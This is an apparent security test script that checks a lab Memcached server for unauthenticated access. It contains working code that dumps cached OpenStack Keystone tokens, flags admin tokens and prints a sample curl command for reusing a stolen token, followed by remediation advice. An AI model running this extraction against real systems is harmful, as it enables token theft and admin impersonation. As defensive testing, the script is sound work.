#!/bin/bash

echo "==== VULN-011: Memcached Network Exposure Test ===="
echo ""
echo "Testing Memcached for network-level accessibility and token extraction"
echo ""

echo "Vulnerability Details:"
echo "  Component: Memcached"
echo "  Severity: CRITICAL (CVSS 9.1)"
echo "  Impact: Authentication token theft via network access"
echo "  CWE: CWE-306 (Missing Authentication for Critical Function)"
echo ""

MEMCACHED_HOST="192.168.100.11"
MEMCACHED_PORT="11211"
RESULTS_FILE="/tmp/vuln-011-results.txt"
> $RESULTS_FILE

echo "==========================================="
echo " PHASE 1: Network Connectivity Test"
echo "==========================================="
echo ""

echo "[1] Testing TCP connection to Memcached..."
echo "  Target: $MEMCACHED_HOST:$MEMCACHED_PORT"

# Test using Python socket
CONNECT_RESULT=$(python3 << 'EOF'
import socket
import sys

HOST = "192.168.100.11"
PORT = 11211

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((HOST, PORT))
    
    # Send stats command
    sock.send(b'stats\r\n')
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    
    if 'STAT' in response:
        print("CONNECTED")
        print(f"RESPONSE:{response[:200]}")
    else:
        print("CONNECTED_NO_RESPONSE")
    
    sock.close()
    sys.exit(0)
    
except ConnectionRefusedError:
    print("REFUSED")
    sys.exit(1)
except socket.timeout:
    print("TIMEOUT")
    sys.exit(2)
except Exception as e:
    print(f"ERROR:{e}")
    sys.exit(3)
EOF
)

CONNECTION_STATUS=$(echo "$CONNECT_RESULT" | head -1)

if [ "$CONNECTION_STATUS" = "CONNECTED" ]; then
    echo "  Result: CONNECTED [VULNERABLE]"
    echo "  PHASE1|connection|VULNERABLE" >> $RESULTS_FILE
    echo ""
    echo "  Impact: Memcached accessible from network"
    echo "  - Authentication tokens exposed"
    echo "  - Session data accessible"
    echo "  - No authentication required"
    
elif [ "$CONNECTION_STATUS" = "REFUSED" ]; then
    echo "  Result: CONNECTION REFUSED [PROTECTED]"
    echo "  PHASE1|connection|PROTECTED" >> $RESULTS_FILE
    echo ""
    echo "  Status: Memcached is protected (firewall active)"
    
elif [ "$CONNECTION_STATUS" = "TIMEOUT" ]; then
    echo "  Result: CONNECTION TIMEOUT"
    echo "  PHASE1|connection|TIMEOUT" >> $RESULTS_FILE
    echo ""
    echo "  Status: Port filtered (firewall may be active)"
    
else
    echo "  Result: ERROR - $CONNECTION_STATUS"
    echo "  PHASE1|connection|ERROR" >> $RESULTS_FILE
fi

echo ""

# ============================================================
# PHASE 2: Memcached Statistics Retrieval
# ============================================================
echo "==========================================="
echo " PHASE 2: Memcached Statistics"
echo "==========================================="
echo ""

if [ "$CONNECTION_STATUS" = "CONNECTED" ]; then
    echo "[2] Retrieving Memcached statistics..."
    
    STATS=$(python3 << 'EOF'
import socket

HOST = "192.168.100.11"
PORT = 11211

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((HOST, PORT))
    
    # Get general stats
    sock.send(b'stats\r\n')
    response = sock.recv(4096).decode('utf-8', errors='ignore')
    
    # Parse key statistics
    for line in response.splitlines():
        if 'curr_connections' in line:
            print(f"CONNECTIONS:{line.split()[2]}")
        elif 'total_items' in line:
            print(f"TOTAL_ITEMS:{line.split()[2]}")
        elif 'curr_items' in line:
            print(f"CURR_ITEMS:{line.split()[2]}")
        elif 'uptime' in line:
            uptime = int(line.split()[2])
            hours = uptime // 3600
            print(f"UPTIME:{hours}h")
    
    sock.close()
    
except Exception as e:
    print(f"ERROR:{e}")
EOF
)
    
    echo "$STATS" | while read line; do
        if [[ $line == CONNECTIONS:* ]]; then
            CONN=${line#CONNECTIONS:}
            echo "  Current Connections: $CONN"
            echo "  PHASE2|connections|$CONN" >> $RESULTS_FILE
        elif [[ $line == CURR_ITEMS:* ]]; then
            ITEMS=${line#CURR_ITEMS:}
            echo "  Current Items: $ITEMS"
            echo "  PHASE2|items|$ITEMS" >> $RESULTS_FILE
        elif [[ $line == UPTIME:* ]]; then
            UPTIME=${line#UPTIME:}
            echo "  Uptime: $UPTIME"
        fi
    done
    
    echo ""
    echo "  Analysis: Successfully retrieved cache statistics"
    echo "  PHASE2|stats|SUCCESS" >> $RESULTS_FILE
else
    echo "[2] Skipped (connection blocked)"
    echo "  PHASE2|stats|SKIPPED" >> $RESULTS_FILE
fi

echo ""

# ============================================================
# PHASE 3: Token Discovery and Extraction
# ============================================================
echo "==========================================="
echo " PHASE 3: Token Extraction and Analysis"
echo "==========================================="
echo ""

if [ "$CONNECTION_STATUS" = "CONNECTED" ]; then
    echo "[3] Attempting to discover and extract cached tokens..."
    echo ""
    
    TOKEN_EXTRACT=$(python3 << 'EOF'
import socket
import re

HOST = "192.168.100.11"
PORT = 11211

def memcache_cmd(cmd):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HOST, PORT))
        sock.send((cmd + '\r\n').encode())
        response = b''
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            response += chunk
            if b'END\r\n' in response or b'ERROR\r\n' in response:
                break
        sock.close()
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"ERROR:{e}"

try:
    # Get slab items
    items_response = memcache_cmd('stats items')
    
    # Find slab IDs
    slabs = set()
    for line in items_response.splitlines():
        match = re.search(r"items:(\d+):number", line)
        if match:
            slabs.add(int(match.group(1)))
    
    if slabs:
        print(f"SLABS_FOUND:{len(slabs)}")
        print(f"SLAB_IDS:{sorted(slabs)}")
        
        # Extract keys and analyze tokens
        total_keys = 0
        token_keys = 0
        extracted_tokens = []
        
        for slab in sorted(slabs)[:3]:  # Check first 3 slabs
            keys_response = memcache_cmd(f'stats cachedump {slab} 20')
            
            for line in keys_response.splitlines():
                if 'ITEM' in line and len(line.split()) > 1:
                    key = line.split()[1]
                    total_keys += 1
                    
                    # Check if key looks like a token (40 chars = SHA1)
                    if len(key) == 40 and all(c in '0123456789abcdef' for c in key):
                        token_keys += 1
                        
                        # Try to get the token data
                        value_response = memcache_cmd(f'get {key}')
                        
                        # Parse token info
                        if 'VALUE' in value_response:
                            # Extract username if present
                            user_match = re.search(r"Vname\np\d+\nV([^\n]+)", value_response)
                            username = user_match.group(1) if user_match else "unknown"
                            
                            # Check if admin
                            is_admin = 'admin' in value_response.lower()
                            
                            # Extract user ID
                            user_id_match = re.search(r"Vuser_id\np\d+\nV([a-f0-9]{32})", value_response)
                            user_id = user_id_match.group(1) if user_id_match else "unknown"
                            
                            # Extract project
                            project_match = re.search(r"Vproject_name\np\d+\nV([^\n]+)", value_response)
                            project = project_match.group(1) if project_match else "unknown"
                            
                            # Extract expiration
                            expires_match = re.search(r"__expires_at\np\d+\nV([^\n]+Z)", value_response)
                            expires = expires_match.group(1) if expires_match else "unknown"
                            
                            # CRITICAL: Extract the actual authentication token
                            # The token is stored as the cache key itself, or we can reconstruct it
                            # For Keystone tokens, the key IS the token identifier
                            auth_token = key  # The cache key is the token identifier
                            
                            # Also try to find if there's a Fernet token in the data
                            fernet_match = re.search(r"(gAAAAA[A-Za-z0-9_-]{100,})", value_response)
                            if fernet_match:
                                auth_token = fernet_match.group(1)
                            
                            token_info = {
                                'key': key,
                                'username': username,
                                'user_id': user_id,
                                'project': project,
                                'is_admin': is_admin,
                                'expires': expires,
                                'auth_token': auth_token
                            }
                            extracted_tokens.append(token_info)
        
        print(f"TOTAL_KEYS:{total_keys}")
        print(f"TOKEN_KEYS:{token_keys}")
        
        # Print extracted token details
        for i, token in enumerate(extracted_tokens[:5], 1):  # Show first 5
            print(f"TOKEN_{i}_KEY:{token['key']}")
            print(f"TOKEN_{i}_USER:{token['username']}")
            print(f"TOKEN_{i}_USERID:{token['user_id']}")
            print(f"TOKEN_{i}_PROJECT:{token['project']}")
            print(f"TOKEN_{i}_ADMIN:{token['is_admin']}")
            print(f"TOKEN_{i}_EXPIRES:{token['expires']}")
            print(f"TOKEN_{i}_AUTHTOKEN:{token['auth_token'][:80]}...")  # Show first 80 chars
    else:
        print("SLABS_FOUND:0")

except Exception as e:
    print(f"ERROR:{e}")
EOF
)
    
    echo "  [3a] Slab Discovery:"
    SLABS=$(echo "$TOKEN_EXTRACT" | grep "SLABS_FOUND:" | cut -d':' -f2)
    SLAB_IDS=$(echo "$TOKEN_EXTRACT" | grep "SLAB_IDS:" | cut -d':' -f2)
    
    if [ -n "$SLABS" ]; then
        echo "    Slabs discovered: $SLABS"
        echo "    Slab IDs: $SLAB_IDS"
        echo "  PHASE3|slabs|$SLABS" >> $RESULTS_FILE
    fi
    
    TOTAL_KEYS=$(echo "$TOKEN_EXTRACT" | grep "TOTAL_KEYS:" | cut -d':' -f2)
    TOKEN_KEYS=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_KEYS:" | cut -d':' -f2)
    
    if [ -n "$TOTAL_KEYS" ]; then
        echo "    Total keys found: $TOTAL_KEYS"
        echo "    Token-like keys: $TOKEN_KEYS"
        echo "  PHASE3|keys|$TOTAL_KEYS" >> $RESULTS_FILE
        echo "  PHASE3|tokens|$TOKEN_KEYS" >> $RESULTS_FILE
    fi
    
    echo ""
    echo "  [3b] Extracted Token Details:"
    
    # Count how many tokens were extracted
    TOKEN_COUNT=$(echo "$TOKEN_EXTRACT" | grep -c "TOKEN_._KEY:")
    
    if [ "$TOKEN_COUNT" -gt 0 ]; then
        echo "    Successfully extracted $TOKEN_COUNT token(s) with complete details:"
        echo ""
        
        # Display each extracted token
        for i in $(seq 1 $TOKEN_COUNT); do
            KEY=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_KEY:" | cut -d':' -f2)
            USER=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_USER:" | cut -d':' -f2)
            USERID=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_USERID:" | cut -d':' -f2)
            PROJECT=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_PROJECT:" | cut -d':' -f2)
            IS_ADMIN=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_ADMIN:" | cut -d':' -f2)
            EXPIRES=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_EXPIRES:" | cut -d':' -f2)
            AUTHTOKEN=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_${i}_AUTHTOKEN:" | cut -d':' -f2-)
            
            echo "    ================================================"
            echo "    Token #$i:"
            echo "    ================================================"
            echo "      Cache Key:  $KEY"
            echo "      Username:   $USER"
            echo "      User ID:    $USERID"
            if [ "$PROJECT" != "unknown" ]; then
                echo "      Project:    $PROJECT"
            fi
            if [ "$IS_ADMIN" = "True" ]; then
                echo "      Role:       ADMIN [CRITICAL]"
            else
                echo "      Role:       User"
            fi
            echo "      Expires:    $EXPIRES"
            echo ""
            echo "      Authentication Token (X-Auth-Token header):"
            echo "      $AUTHTOKEN"
            echo ""
            echo "      Usage: curl -H 'X-Auth-Token: $AUTHTOKEN' \\"
            echo "             http://192.168.100.11:8774/v2.1/servers"
            echo "    ================================================"
            echo ""
        done
        
        ADMIN_COUNT=$(echo "$TOKEN_EXTRACT" | grep "TOKEN_._ADMIN:True" | wc -l)
        if [ "$ADMIN_COUNT" -gt 0 ]; then
            echo "    [CRITICAL WARNING] $ADMIN_COUNT admin token(s) extracted!"
            echo "    Attacker can use these tokens to perform admin operations!"
        fi
        
        echo "  PHASE3|extracted|$TOKEN_COUNT" >> $RESULTS_FILE
    else
        echo "    No complete tokens extracted, but token-like keys discovered: $TOKEN_KEYS"
        echo "    Keys found indicate token storage structure is present"
        echo "  PHASE3|extracted|0" >> $RESULTS_FILE
    fi
    
    echo ""
    echo "  [3c] Attack Impact:"
    echo "    - Attacker can enumerate all cached keys"
    echo "    - Attacker can extract complete token data"
    echo "    - Attacker can obtain USABLE authentication tokens"
    echo "    - Attacker can parse user information from tokens"
    echo "    - Attacker can identify admin tokens"
    echo "    - Attacker can use tokens directly in API calls"
    echo "    - NO PASSWORD REQUIRED - tokens bypass authentication"
    echo ""
    echo "  [3d] Attack Scenario:"
    echo "    1. Connect to exposed Memcached (no auth required)"
    echo "    2. Enumerate memory slabs to find token storage"
    echo "    3. Extract all cached authentication tokens"
    echo "    4. Parse tokens to identify admin accounts"
    echo "    5. Use stolen admin token in X-Auth-Token header"
    echo "    6. Execute OpenStack API commands as admin user"
    echo "    7. Create backdoor accounts, exfiltrate data, etc."
    
    echo ""
    echo "  Impact: Complete authentication bypass via token theft"
    echo "  PHASE3|extraction|POSSIBLE" >> $RESULTS_FILE
else
    echo "[3] Skipped (connection blocked)"
    echo "  PHASE3|extraction|BLOCKED" >> $RESULTS_FILE
fi

echo ""

# ============================================================
# RESULTS SUMMARY
# ============================================================
echo "==========================================="
echo "         VULN-011 RESULTS"
echo "==========================================="
echo ""

CONNECTION_TEST=$(grep "PHASE1|connection" $RESULTS_FILE | cut -d'|' -f3)

if [ "$CONNECTION_TEST" = "VULNERABLE" ]; then
    echo "  Vulnerability Status: CONFIRMED [VULNERABLE]"
    echo ""
    echo "  Memcached Network Exposure:"
    echo "    - Port 11211 accessible from network"
    echo "    - No authentication required"
    echo "    - Cache statistics retrievable"
    
    SLABS=$(grep "PHASE3|slabs" $RESULTS_FILE | cut -d'|' -f3)
    TOKENS=$(grep "PHASE3|tokens" $RESULTS_FILE | cut -d'|' -f3)
    EXTRACTED=$(grep "PHASE3|extracted" $RESULTS_FILE | cut -d'|' -f3)
    
    if [ -n "$SLABS" ] && [ "$SLABS" -gt 0 ]; then
        echo "    - Active cache with $SLABS slab(s)"
    fi
    
    if [ -n "$TOKENS" ] && [ "$TOKENS" -gt 0 ]; then
        echo "    - $TOKENS token-like keys discovered [WARNING]"
    fi
    
    if [ -n "$EXTRACTED" ] && [ "$EXTRACTED" -gt 0 ]; then
        echo "    - $EXTRACTED complete token(s) extracted with auth values [CRITICAL]"
    fi
    
    echo ""
    echo "  CVSS 9.1 - CRITICAL"
    echo "  Impact:"
    echo "    - Complete authentication bypass"
    echo "    - Admin token theft with usable token values"
    echo "    - Session hijacking"
    echo "    - Direct API access without passwords"
    echo "    - User impersonation"
    echo ""
    echo "  Remediation Required:"
    echo "    - Restrict Memcached to management network only"
    echo "    - Apply firewall rules (iptables)"
    echo "    - Consider SASL authentication"
    
elif [ "$CONNECTION_TEST" = "PROTECTED" ]; then
    echo "  Vulnerability Status: REMEDIATED [PROTECTED]"
    echo ""
    echo "  Protection Confirmed:"
    echo "    - Port 11211 blocked from network"
    echo "    - Firewall rules active"
    echo "    - Token cache protected from remote access"
    echo "    - Token extraction prevented"
    echo ""
    echo "  STIG Control: OSCACHE-001 (PASS)"
    
else
    echo "  Vulnerability Status: UNKNOWN"
    echo "  Test may have encountered errors"
fi

echo ""
echo "==========================================="
echo ""

# Cleanup
rm -f $RESULTS_FILE

echo "=== Test Complete ==="
